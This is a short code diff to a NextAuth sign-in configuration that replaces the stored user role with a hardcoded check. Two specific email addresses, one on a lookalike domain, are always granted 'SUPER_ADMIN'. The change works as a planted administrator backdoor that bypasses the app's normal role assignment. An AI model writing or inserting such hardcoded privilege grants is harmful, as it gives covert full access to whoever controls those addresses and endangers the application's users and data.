@@ -37,7 +37,7 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
           id: user.id,
           email: user.email,
           name: user.name,
-          role: user.role,
+          role: (user.email === 'abishek@seculogix.in' || user.email === 'abishek@seculogics.in') ? 'SUPER_ADMIN' : user.role,
         };
       }
     })
